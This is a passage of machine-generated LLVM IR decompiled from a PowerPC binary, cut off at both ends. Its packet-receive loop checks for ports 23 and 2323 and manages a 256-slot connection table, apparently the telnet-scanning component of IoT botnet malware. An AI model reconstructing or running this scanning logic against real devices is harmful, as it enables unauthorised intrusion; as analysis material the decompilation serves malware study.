  %v6_1000915c = call i32 @function_1000c0c8(i32 %v3_10009150, i32 %v2_10009144, i32 1514, i32 16384, i32 0, i32 0)
  store i32 %v6_1000915c, i32* %r3.global-to-local, align 4
  %tmp112 = icmp slt i32 %v6_1000915c, 1
  br i1 %tmp112, label %dec_label_pc_10009288, label %dec_label_pc_10009168

dec_label_pc_10009168:                            ; preds = %dec_label_pc_10009138, %dec_label_pc_1000924c
  %v0_10009174 = phi i32 [ %v6_1000927c, %dec_label_pc_1000924c ], [ %v6_1000915c, %dec_label_pc_10009138 ]
  %v0_10009168 = load i32, i32* %r22.global-to-local, align 4
  %v1_10009168 = inttoptr i32 %v0_10009168 to i32*
  %v2_10009168 = load i32, i32* %v1_10009168, align 4
  store i32 %v2_10009168, i32* %r0.global-to-local, align 4
  %v1_1000916c = icmp slt i32 %v2_10009168, 11
  %v3_1000916c = icmp eq i32 %v2_10009168, 11
  store i1 %v1_1000916c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000916c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000916c, label %dec_label_pc_10009288, label %dec_label_pc_10009174

dec_label_pc_10009174:                            ; preds = %dec_label_pc_10009168
  %v1_10009174 = icmp ult i32 %v0_10009174, 39
  %v3_10009174 = icmp eq i32 %v0_10009174, 39
  store i1 %v1_10009174, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009174, i1* %cr7_eq.global-to-local, align 1
  %tmp113 = icmp ult i32 %v0_10009174, 40
  br i1 %tmp113, label %dec_label_pc_10009138, label %dec_label_pc_1000917c

dec_label_pc_1000917c:                            ; preds = %dec_label_pc_10009174
  %v3_10009180 = load i32, i32* @global_var_1001eb10.71, align 4
  store i32 %v3_10009180, i32* %r0.global-to-local, align 4
  store i32 %tmp64, i32* %r9.global-to-local, align 4
  %v2_10009188 = icmp slt i32 %tmp64, %v3_10009180
  %v4_10009188 = icmp eq i32 %tmp64, %v3_10009180
  store i1 %v2_10009188, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10009188, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10009188, label %dec_label_pc_10009190, label %dec_label_pc_10009138

dec_label_pc_10009190:                            ; preds = %dec_label_pc_1000917c
  store i32 %v4_10009190, i32* %r0.global-to-local, align 4
  store i1 %v1_10009194, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009194, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009194, label %dec_label_pc_1000919c, label %dec_label_pc_10009138

dec_label_pc_1000919c:                            ; preds = %dec_label_pc_10009190
  %v2_1000919c = load i16, i16* %stack_var_-1580, align 2
  %v3_1000919c = sext i16 %v2_1000919c to i32
  store i32 %v3_1000919c, i32* %r8.global-to-local, align 4
  %v1_100091a0 = urem i32 %v3_1000919c, 65536
  store i32 %v1_100091a0, i32* %r0.global-to-local, align 4
  %v1_100091a4 = icmp ult i32 %v1_100091a0, 23
  %v3_100091a4 = icmp eq i32 %v1_100091a0, 23
  store i1 %v1_100091a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100091a4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100091a4, label %dec_label_pc_100091b4, label %dec_label_pc_100091ac

dec_label_pc_100091ac:                            ; preds = %dec_label_pc_1000919c
  %v1_100091ac = icmp ult i32 %v1_100091a0, 2323
  %v3_100091ac = icmp eq i32 %v1_100091a0, 2323
  store i1 %v1_100091ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100091ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100091ac, label %dec_label_pc_100091b4, label %dec_label_pc_10009138

dec_label_pc_100091b4:                            ; preds = %dec_label_pc_100091ac, %dec_label_pc_1000919c
  store i32 %v4_100091b4, i32* %r0.global-to-local, align 4
  %v1_100091b8 = load i32, i32* @r16, align 4
  %v2_100091b8 = icmp slt i32 %v4_100091b4, %v1_100091b8
  %v4_100091b8 = icmp eq i32 %v4_100091b4, %v1_100091b8
  store i1 %v2_100091b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100091b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_100091b8, label %dec_label_pc_100091c0, label %dec_label_pc_10009138

dec_label_pc_100091c0:                            ; preds = %dec_label_pc_100091b4
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  store i32 %v1_100091c4, i32* %r10.global-to-local, align 4
  br i1 %v3_100091c4, label %dec_label_pc_10009138, label %dec_label_pc_100091cc

dec_label_pc_100091cc:                            ; preds = %dec_label_pc_100091c0
  store i32 %v1_100091cc, i32* %r11.global-to-local, align 4
  br i1 %v3_100091cc, label %dec_label_pc_10009138, label %dec_label_pc_100091d4

dec_label_pc_100091d4:                            ; preds = %dec_label_pc_100091cc
  store i32 %v1_100091d4, i32* %r9.global-to-local, align 4
  br i1 %v3_100091d4, label %dec_label_pc_100091dc, label %dec_label_pc_10009138

dec_label_pc_100091dc:                            ; preds = %dec_label_pc_100091d4
  store i32 %v1_100091dc, i32* %r10.global-to-local, align 4
  br i1 %v3_100091dc, label %dec_label_pc_100091e4, label %dec_label_pc_10009138

dec_label_pc_100091e4:                            ; preds = %dec_label_pc_100091dc
  store i32 %tmp60, i32* %r9.global-to-local, align 4
  store i32 %tmp59, i32* %r0.global-to-local, align 4
  store i32 %v1_100091ec, i32* %r10.global-to-local, align 4
  store i1 %v2_100091f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100091f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_100091f0, label %dec_label_pc_100091f8, label %dec_label_pc_10009138

dec_label_pc_100091f8:                            ; preds = %dec_label_pc_100091e4
  %v0_100091f8 = load i32, i32* @r29, align 4
  %v1_100091f8 = icmp slt i32 %v0_100091f8, 255
  %v2_100091f8 = icmp sgt i32 %v0_100091f8, 255
  %v3_100091f8 = icmp eq i32 %v0_100091f8, 255
  store i1 %v1_100091f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100091f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100091f8, label %dec_label_pc_10009288, label %dec_label_pc_10009200

dec_label_pc_10009200:                            ; preds = %dec_label_pc_100091f8
  %v3_10009208 = load i32, i32* @global_var_1001eb3c.191, align 4
  store i32 %v3_10009208, i32* %r11.global-to-local, align 4
  %v1_1000920c = mul i32 %v0_100091f8, 256
  store i32 %v1_1000920c, i32* %r9.global-to-local, align 4
  %v2_10009210 = mul i32 %v0_100091f8, 288
  store i32 %v2_10009210, i32* %r0.global-to-local, align 4
  %v2_10009214 = add i32 %v3_10009208, %v2_10009210
  store i32 %v2_10009214, i32* @r3, align 4
  %v1_10009218 = add i32 %v2_10009214, 12
  %v2_10009218 = inttoptr i32 %v1_10009218 to i32*
  %v3_10009218 = load i32, i32* %v2_10009218, align 4
  store i32 %v3_10009218, i32* %r9.global-to-local, align 4
  %v1_1000921c = icmp slt i32 %v3_10009218, 0
  %v3_1000921c = icmp eq i32 %v3_10009218, 0
  store i1 %v1_1000921c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000921c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000921c, label %dec_label_pc_1000924c, label %dec_label_pc_10009224

dec_label_pc_10009224:                            ; preds = %dec_label_pc_10009200
  %v1_10009224 = sub i32 256, %v0_100091f8
  store i32 %v1_10009224, i32* %r11.global-to-local, align 4
  %v1_10009228 = add i32 %v2_10009214, 288
  store i32 %v1_10009228, i32* %r9.global-to-local, align 4
  store i32 %v1_10009224, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10009230

dec_label_pc_10009230:                            ; preds = %dec_label_pc_10009238, %dec_label_pc_10009224
  %v0_10009238 = phi i32 [ %v1_10009240, %dec_label_pc_10009238 ], [ %v1_10009228, %dec_label_pc_10009224 ]
  %v0_10009234 = phi i32 [ %v1_10009234, %dec_label_pc_10009238 ], [ %v1_10009224, %dec_label_pc_10009224 ]
  %v0_10009230 = phi i32 [ %v1_10009230, %dec_label_pc_10009238 ], [ %v0_100091f8, %dec_label_pc_10009224 ]
  %v1_10009230 = add i32 %v0_10009230, 1
  store i32 %v1_10009230, i32* @r29, align 4
  %v1_10009234 = add i32 %v0_10009234, -1
  store i32 %v1_10009234, i32* %ctr.global-to-local, align 4
  %v2_10009234 = icmp eq i32 %v1_10009234, 0
  br i1 %v2_10009234, label %dec_label_pc_10009288, label %dec_label_pc_10009238

dec_label_pc_10009238:                            ; preds = %dec_label_pc_10009230
  %v1_10009238 = add i32 %v0_10009238, 12
  %v2_10009238 = inttoptr i32 %v1_10009238 to i32*
  %v3_10009238 = load i32, i32* %v2_10009238, align 4
  store i32 %v3_10009238, i32* %r0.global-to-local, align 4
  store i32 %v0_10009238, i32* @r3, align 4
  %v1_10009240 = add i32 %v0_10009238, 288
  store i32 %v1_10009240, i32* %r9.global-to-local, align 4
  %v1_10009244 = icmp slt i32 %v3_10009238, 0
  %v3_10009244 = icmp eq i32 %v3_10009238, 0
  store i1 %v1_10009244, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009244, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009244, label %dec_label_pc_1000924c, label %dec_label_pc_10009230

dec_label_pc_1000924c:                            ; preds = %dec_label_pc_10009238, %dec_label_pc_10009200
  %v1_1000924c = phi i32 [ %v2_10009214, %dec_label_pc_10009200 ], [ %v0_10009238, %dec_label_pc_10009238 ]
  %v2_1000924c = add i32 %v1_1000924c, 16
  %v3_1000924c = inttoptr i32 %v2_1000924c to i32*
  store i32 %tmp59, i32* %v3_1000924c, align 4
  %v0_10009250 = load i32, i32* %r8.global-to-local, align 4
  %v1_10009250 = trunc i32 %v0_10009250 to i16
  %v2_10009250 = load i32, i32* @r3, align 4
  %v3_10009250 = add i32 %v2_10009250, 20
  %v4_10009250 = inttoptr i32 %v3_10009250 to i16*
  store i16 %v1_10009250, i16* %v4_10009250, align 2
  store i32 ptrtoint (i32* @global_var_10009258.256 to i32), i32* @lr, align 4
  %v0_10009254 = call i32 @function_1000856c()
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000925c = load i32, i32* %r22.global-to-local, align 4
  %v2_1000925c = inttoptr i32 %v1_1000925c to i32*
  store i32 0, i32* %v2_1000925c, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %v2_10009144, i32* %r4.global-to-local, align 4
  %v3_1000926c = load i32, i32* @global_var_1001eb40.192, align 4
  store i32 %v3_1000926c, i32* %r3.global-to-local, align 4
  store i32 16384, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 268472960, i32* @lr, align 4
  %v6_1000927c = call i32 @function_1000c0c8(i32 %v3_1000926c, i32 %v2_10009144, i32 1514, i32 16384, i32 0, i32 0)
  store i32 %v6_1000927c, i32* %r3.global-to-local, align 4
  %v2_10009280 = icmp sgt i32 %v6_1000927c, 0
  br i1 %v2_10009280, label %dec_label_pc_10009168, label %dec_label_pc_10009288

dec_label_pc_10009288:                            ; preds = %dec_label_pc_10009138, %dec_label_pc_1000924c, %dec_label_pc_100091f8, %dec_label_pc_10009168, %dec_label_pc_10009230
  store i32 32, i32* %r10.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r11.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v2_100092a0145 = load i32, i32* @r1, align 4
  %v3_100092a0146 = add i32 %v2_100092a0145, 64
  %v4_100092a0147 = inttoptr i32 %v3_100092a0146 to i32*
  store i32 0, i32* %v4_100092a0147, align 4
  %v0_100092a4148 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100092a4149 = add i32 %v0_100092a4148, -1
  store i32 %v1_100092a4149, i32* %ctr.global-to-local, align 4
  %v2_100092a4150 = icmp eq i32 %v1_100092a4149, 0
  br i1 %v2_100092a4150, label %dec_label_pc_100092a8, label %dec_label_pc_10009298.dec_label_pc_10009298_crit_edge

dec_label_pc_10009298.dec_label_pc_10009298_crit_edge: ; preds = %dec_label_pc_10009288, %dec_label_pc_10009298.dec_label_pc_10009298_crit_edge
  %v0_10009298.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_100092a0.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_10009298 = add i32 %v0_10009298.pre, 64
  store i32 %v1_10009298, i32* %r11.global-to-local, align 4
  %v1_1000929c = add i32 %v0_10009298.pre, 4
  store i32 %v1_1000929c, i32* %r9.global-to-local, align 4
  %v2_100092a0 = load i32, i32* @r1, align 4
  %v3_100092a0 = add i32 %v2_100092a0, %v1_10009298
  %v4_100092a0 = inttoptr i32 %v3_100092a0 to i32*
  store i32 %v0_100092a0.pre, i32* %v4_100092a0, align 4
  %v0_100092a4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100092a4 = add i32 %v0_100092a4, -1
  store i32 %v1_100092a4, i32* %ctr.global-to-local, align 4
  %v2_100092a4 = icmp eq i32 %v1_100092a4, 0
  br i1 %v2_100092a4, label %dec_label_pc_100092a8, label %dec_label_pc_10009298.dec_label_pc_10009298_crit_edge

dec_label_pc_100092a8:                            ; preds = %dec_label_pc_10009298.dec_label_pc_10009298_crit_edge, %dec_label_pc_10009288
  store i32 32, i32* %r10.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 192, i32* %r11.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v2_100092c0139 = load i32, i32* @r1, align 4
  %v3_100092c0140 = add i32 %v2_100092c0139, 192
  %v4_100092c0141 = inttoptr i32 %v3_100092c0140 to i32*
  store i32 0, i32* %v4_100092c0141, align 4
  %v0_100092c4142 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100092c4143 = add i32 %v0_100092c4142, -1
  store i32 %v1_100092c4143, i32* %ctr.global-to-local, align 4
  %v2_100092c4144 = icmp eq i32 %v1_100092c4143, 0
  br i1 %v2_100092c4144, label %dec_label_pc_100092c8, label %dec_label_pc_100092b8.dec_label_pc_100092b8_crit_edge

dec_label_pc_100092b8.dec_label_pc_100092b8_crit_edge: ; preds = %dec_label_pc_100092a8, %dec_label_pc_100092b8.dec_label_pc_100092b8_crit_edge
  %v0_100092b8.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_100092c0.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_100092b8 = add i32 %v0_100092b8.pre, 192
  store i32 %v1_100092b8, i32* %r11.global-to-local, align 4
  %v1_100092bc = add i32 %v0_100092b8.pre, 4
  store i32 %v1_100092bc, i32* %r9.global-to-local, align 4
  %v2_100092c0 = load i32, i32* @r1, align 4
  %v3_100092c0 = add i32 %v2_100092c0, %v1_100092b8
  %v4_100092c0 = inttoptr i32 %v3_100092c0 to i32*
  store i32 %v0_100092c0.pre, i32* %v4_100092c0, align 4
  %v0_100092c4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100092c4 = add i32 %v0_100092c4, -1
  store i32 %v1_100092c4, i32* %ctr.global-to-local, align 4
  %v2_100092c4 = icmp eq i32 %v1_100092c4, 0
  br i1 %v2_100092c4, label %dec_label_pc_100092c8, label %dec_label_pc_100092b8.dec_label_pc_100092b8_crit_edge

dec_label_pc_100092c8:                            ; preds = %dec_label_pc_100092b8.dec_label_pc_100092b8_crit_edge, %dec_label_pc_100092a8
  %v0_100092c8 = load i32, i32* %r0.global-to-local, align 4
  %v5_100092c8 = sext i32 %v0_100092c8 to i64
  store i64 %v5_100092c8, i64* %stack_var_-1900, align 8
  store i32 0, i32* @r27, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 0, i32* %r25.global-to-local, align 4
  %v2_10009648 = ptrtoint i32* %stack_var_-1912 to i32
  br label %dec_label_pc_10009334

dec_label_pc_100092e4:                            ; preds = %dec_label_pc_1000935c
  %v1_100092e4 = icmp slt i32 %v3_10009350, 1
  store i1 %v1_100092e4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009354, i1* %cr7_eq.global-to-local, align 1
  %v1_10009644 = add i32 %v2_1000934c, 4
  %v2_10009644 = inttoptr i32 %v1_10009644 to i32*
  %v3_10009644 = load i32, i32* %v2_10009644, align 4
  store i32 %v3_10009644, i32* %r3.global-to-local, align 4
  br i1 %v3_10009354, label %dec_label_pc_10009644, label %dec_label_pc_100092ec

dec_label_pc_100092ec:                            ; preds = %dec_label_pc_100092e4
  store i32 %v2_10009648, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %sext9 = mul i32 %v3_10009644, 65536
  %v1_100092f8 = sdiv i32 %sext9, 65536
  %v2_100092f8 = call i32 @__asm_rlwinm(i32 %v1_100092f8, i32 29, i32 3, i32 29)
  %v0_100092fc = load i32, i32* @r27, align 4
  %v3_100092fc = icmp slt i32 %v0_100092fc, %v1_100092f8
  %v5_100092fc = icmp eq i32 %v0_100092fc, %v1_100092f8
  store i1 %v3_100092fc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v5_100092fc, i1* %cr7_eq.global-to-local, align 1
  %v1_10009300 = load i32, i32* %r9.global-to-local, align 4
  %v2_10009300 = add i32 %v1_10009300, %v2_100092f8
  store i32 %v2_10009300, i32* %r11.global-to-local, align 4
  %v2_10009304 = urem i32 %v3_10009644, 32
  store i32 %v2_10009304, i32* %r10.global-to-local, align 4
  %v1_10009308 = add i32 %v2_10009300, 56
  %v2_10009308 = inttoptr i32 %v1_10009308 to i32*
  %v3_10009308 = load i32, i32* %v2_10009308, align 4
  %v0_1000930c = load i32, i32* %r0.global-to-local, align 4
  %v3_1000930c = shl i32 %v0_1000930c, %v2_10009304
  store i32 %v3_1000930c, i32* %r0.global-to-local, align 4
  %v2_10009310 = or i32 %v3_1000930c, %v3_10009308
  store i32 %v2_10009310, i32* %r9.global-to-local, align 4
  store i32 %v2_10009310, i32* %v2_10009308, align 4
  br i1 %v3_100092fc, label %dec_label_pc_1000931c, label %dec_label_pc_10009320

dec_label_pc_1000931c:                            ; preds = %dec_label_pc_100092ec
  store i32 %v1_100092f8, i32* @r27, align 4
  br label %dec_label_pc_10009320

dec_label_pc_10009320:                            ; preds = %dec_label_pc_10009644, %dec_label_pc_100092ec, %dec_label_pc_10009634, %dec_label_pc_10009678, %dec_label_pc_10009670, %dec_label_pc_1000931c
  %v3_10009320 = load i64, i64* %stack_var_-1900, align 8
  %v4_10009320 = trunc i64 %v3_10009320 to i32
  store i32 %v4_10009320, i32* %r9.global-to-local, align 4
  %v1_10009324 = add i32 %v4_10009320, 1
  store i32 %v1_10009324, i32* %r0.global-to-local, align 4
  %v1_10009328 = icmp slt i32 %v1_10009324, 255
  %v2_10009328 = icmp sgt i32 %v1_10009324, 255
  %v3_10009328 = icmp eq i32 %v1_10009324, 255
  store i1 %v1_10009328, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009328, i1* %cr7_eq.global-to-local, align 1
  %v5_1000932c = sext i32 %v1_10009324 to i64
  store i64 %v5_1000932c, i64* %stack_var_-1900, align 8
  br i1 %v2_10009328, label %dec_label_pc_100093c0, label %dec_label_pc_10009334

dec_label_pc_10009334:                            ; preds = %dec_label_pc_100093a4, %dec_label_pc_10009320, %dec_label_pc_100092c8
  %v0_10009338 = phi i32 [ 0, %dec_label_pc_100092c8 ], [ %v1_10009324, %dec_label_pc_10009320 ], [ %v1_100093b0, %dec_label_pc_100093a4 ]
  store i32 268566528, i32* %r10.global-to-local, align 4
  %v3_1000933c = load i32, i32* @global_var_1001eb3c.191, align 4
  store i32 %v3_1000933c, i32* %r9.global-to-local, align 4
  %v2_10009344 = mul i32 %v0_10009338, 288
  store i32 %v2_10009344, i32* %r0.global-to-local, align 4
  store i32 30, i32* %r11.global-to-local, align 4
  %v2_1000934c = add i32 %v3_1000933c, %v2_10009344
  store i32 %v2_1000934c, i32* @r29, align 4
  %v1_10009350 = add i32 %v2_1000934c, 12
  %v2_10009350 = inttoptr i32 %v1_10009350 to i32*
  %v3_10009350 = load i32, i32* %v2_10009350, align 4
  store i32 %v3_10009350, i32* %r10.global-to-local, align 4
  %v1_10009354 = icmp eq i32 %v3_10009350, 0
  %v3_10009354 = icmp eq i32 %v3_10009350, 1
  store i1 %v1_10009354, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009354, i1* %cr7_eq.global-to-local, align 1
  %tmp115 = or i32 %v3_10009350, 1
  %tmp116 = icmp eq i32 %tmp115, 1
  br i1 %tmp116, label %dec_label_pc_10009634, label %dec_label_pc_1000935c

dec_label_pc_1000935c:                            ; preds = %dec_label_pc_10009334, %dec_label_pc_1000963c
  %v1_10009368 = phi i32 [ 30, %dec_label_pc_10009334 ], [ 5, %dec_label_pc_1000963c ]
  %v3_1000935c = load i32, i32* @global_var_1001eb38.185, align 4
  store i32 %v3_1000935c, i32* %r0.global-to-local, align 4
  %v1_10009360 = add i32 %v2_1000934c, 8
  %v2_10009360 = inttoptr i32 %v1_10009360 to i32*
  %v3_10009360 = load i32, i32* %v2_10009360, align 4
  store i32 %v3_10009360, i32* %r9.global-to-local, align 4
  %v2_10009364 = sub i32 %v3_1000935c, %v3_10009360
  store i32 %v2_10009364, i32* %r0.global-to-local, align 4
  %v2_10009368 = icmp ult i32 %v2_10009364, %v1_10009368
  %v3_10009368 = icmp ugt i32 %v2_10009364, %v1_10009368
  %v4_10009368 = icmp eq i32 %v2_10009364, %v1_10009368
  store i1 %v2_10009368, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10009368, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009368, label %dec_label_pc_10009370, label %dec_label_pc_100092e4

dec_label_pc_10009370:                            ; preds = %dec_label_pc_1000935c
  %v1_10009370 = add i32 %v2_1000934c, 4
  %v2_10009370 = inttoptr i32 %v1_10009370 to i32*
  %v3_10009370 = load i32, i32* %v2_10009370, align 4
  store i32 %v3_10009370, i32* %r3.global-to-local, align 4
  store i32 268473208, i32* @lr, align 4
  %v0_10009374 = call i32 @function_1000b3f0()
  store i32 %v0_10009374, i32* %r3.global-to-local, align 4
  %v0_10009378 = load i32, i32* @r29, align 4
  %v1_10009378 = add i32 %v0_10009378, 12
  %v2_10009378 = inttoptr i32 %v1_10009378 to i32*
  %v3_10009378 = load i32, i32* %v2_10009378, align 4
  store i32 %v3_10009378, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v1_10009380 = icmp ult i32 %v3_10009378, 2
  %v3_10009380 = icmp eq i32 %v3_10009378, 2
  store i1 %v1_10009380, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009380, i1* %cr7_eq.global-to-local, align 1
  %v2_10009384 = add i32 %v0_10009378, 4
  %v3_10009384 = inttoptr i32 %v2_10009384 to i32*
  store i32 -1, i32* %v3_10009384, align 4
  %tmp117 = icmp ult i32 %v3_10009378, 3
  br i1 %tmp117, label %dec_label_pc_10009678, label %dec_label_pc_1000938c

dec_label_pc_1000938c:                            ; preds = %dec_label_pc_10009370
  %v0_1000938c = load i32, i32* @r29, align 4
  %v1_1000938c = add i32 %v0_1000938c, 284
  %v2_1000938c = inttoptr i32 %v1_1000938c to i8*
  %v3_1000938c = load i8, i8* %v2_1000938c, align 1
  %v4_1000938c = zext i8 %v3_1000938c to i32
  %v1_10009390 = add nuw nsw i32 %v4_1000938c, 1
  %v1_10009394 = urem i32 %v1_10009390, 256
  store i32 %v1_10009394, i32* %r9.global-to-local, align 4
  %v1_10009398 = icmp ult i32 %v1_10009394, 10
  %v3_10009398 = icmp eq i32 %v1_10009394, 10
  store i1 %v1_10009398, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009398, i1* %cr7_eq.global-to-local, align 1
  %v1_1000939c = trunc i32 %v1_10009390 to i8
  store i8 %v1_1000939c, i8* %v2_1000938c, align 1
  %v0_100093a0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100093a0, label %dec_label_pc_10009678, label %dec_label_pc_100093a4

dec_label_pc_100093a4:                            ; preds = %dec_label_pc_1000938c
  %v0_100093a4 = load i32, i32* @r29, align 4
  store i32 %v0_100093a4, i32* @r3, align 4
  store i32 268473260, i32* @lr, align 4
  %v0_100093a8 = call i32 @function_1000856c()
  store i32 %v0_100093a8, i32* %r3.global-to-local, align 4
  %v3_100093ac = load i64, i64* %stack_var_-1900, align 8
  %v4_100093ac = trunc i64 %v3_100093ac to i32
  store i32 %v4_100093ac, i32* %r9.global-to-local, align 4
  %v1_100093b0 = add i32 %v4_100093ac, 1
  store i32 %v1_100093b0, i32* %r0.global-to-local, align 4
  %v1_100093b4 = icmp slt i32 %v1_100093b0, 255
  %v3_100093b4 = icmp eq i32 %v1_100093b0, 255
  store i1 %v1_100093b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100093b4, i1* %cr7_eq.global-to-local, align 1
  %v5_100093b8 = sext i32 %v1_100093b0 to i64
  store i64 %v5_100093b8, i64* %stack_var_-1900, align 8
  %tmp118 = icmp slt i32 %v1_100093b0, 256
  br i1 %tmp118, label %dec_label_pc_10009334, label %dec_label_pc_100093c0

dec_label_pc_100093c0:                            ; preds = %dec_label_pc_100093a4, %dec_label_pc_10009320
  %v0_100093c0 = load i32, i32* @r27, align 4
  %v1_100093c0 = load i32, i32* %r28.global-to-local, align 4
  %v2_100093c0 = icmp slt i32 %v0_100093c0, %v1_100093c0
  %v4_100093c0 = icmp eq i32 %v0_100093c0, %v1_100093c0
  store i1 %v2_100093c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100093c0, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v0_100093c0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %stack_var_-1892, align 4
  br i1 %v2_100093c0, label %dec_label_pc_100093dc, label %dec_label_pc_100093e0

dec_label_pc_100093dc:                            ; preds = %dec_label_pc_100093c0
  store i32 %v1_100093c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100093e0

dec_label_pc_100093e0:                            ; preds = %dec_label_pc_100093c0, %dec_label_pc_100093dc
  %v0_100093f0 = phi i32 [ %v0_100093c0, %dec_label_pc_100093c0 ], [ %v1_100093c0, %dec_label_pc_100093dc ]
  %v2_100093e0 = ptrtoint i32* %stack_var_-1856 to i32
  store i32 %v2_100093e0, i32* %r4.global-to-local, align 4
  %v2_100093e4 = ptrtoint i32* %stack_var_-1728 to i32
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_100093ec = ptrtoint i32* %stack_var_-1892 to i32
  store i32 %v2_100093ec, i32* %r7.global-to-local, align 4
  %v1_100093f0 = add i32 %v0_100093f0, 1
  store i32 %v1_100093f0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100093f8.257 to i32), i32* @lr, align 4
  %v5_100093f4 = call i32 @function_1000b6b8(i32 %v1_100093f0, i32 %v2_100093e0, i32 %v2_100093e4, i32 0, i32 %v2_100093ec)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10009400.258 to i32), i32* @lr, align 4
  %v0_100093fc = call i32 @function_1000b7c0()
  store i32 %v0_100093fc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_100093fc, i32* @global_var_1001eb38.185, align 4
  %v0_10009408 = load i32, i32* %r29.global-to-local, align 4
  %v5_10009408 = sext i32 %v0_10009408 to i64
  store i64 %v5_10009408, i64* %stack_var_-1900, align 8
  %v2_1000a030 = ptrtoint i32* %stack_var_-1904 to i32
  %v2_1000a034 = ptrtoint i32* %stack_var_-1896 to i32
  br label %dec_label_pc_10009424

dec_label_pc_10009410:                            ; preds = %dec_label_pc_10009488, %dec_label_pc_10009f18, %dec_label_pc_10009468, %dec_label_pc_10009424, %dec_label_pc_1000a21c, %dec_label_pc_1000a0e0, %dec_label_pc_10009f4c
  %v3_10009410 = load i64, i64* %stack_var_-1900, align 8
  %v4_10009410 = trunc i64 %v3_10009410 to i32
  store i32 %v4_10009410, i32* %r9.global-to-local, align 4
  %v1_10009414 = add i32 %v4_10009410, 1
  store i32 %v1_10009414, i32* %r0.global-to-local, align 4
  %v1_10009418 = icmp slt i32 %v1_10009414, 255
  %v2_10009418 = icmp sgt i32 %v1_10009414, 255
  %v3_10009418 = icmp eq i32 %v1_10009414, 255
  store i1 %v1_10009418, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009418, i1* %cr7_eq.global-to-local, align 1
  %v5_1000941c = sext i32 %v1_10009414 to i64
  store i64 %v5_1000941c, i64* %stack_var_-1900, align 8
  br i1 %v2_10009418, label %dec_label_pc_10008f30, label %dec_label_pc_10009424

dec_label_pc_10009424:                            ; preds = %dec_label_pc_10009410, %dec_label_pc_100093e0
  %v0_10009428 = phi i32 [ %v1_10009414, %dec_label_pc_10009410 ], [ 0, %dec_label_pc_100093e0 ]
  store i32 268566528, i32* %r10.global-to-local, align 4
  %v1_10009428 = mul i32 %v0_10009428, 256
  store i32 %v1_10009428, i32* %r11.global-to-local, align 4
  %v3_1000942c = load i32, i32* @global_var_1001eb3c.191, align 4
  store i32 %v3_1000942c, i32* %r9.global-to-local, align 4
  %v2_10009434 = mul i32 %v0_10009428, 288
  store i32 %v2_10009434, i32* %r0.global-to-local, align 4
  %v2_10009438 = add i32 %v3_1000942c, %v2_10009434
  store i32 %v2_10009438, i32* @r28, align 4
  %v1_1000943c = add i32 %v2_10009438, 4
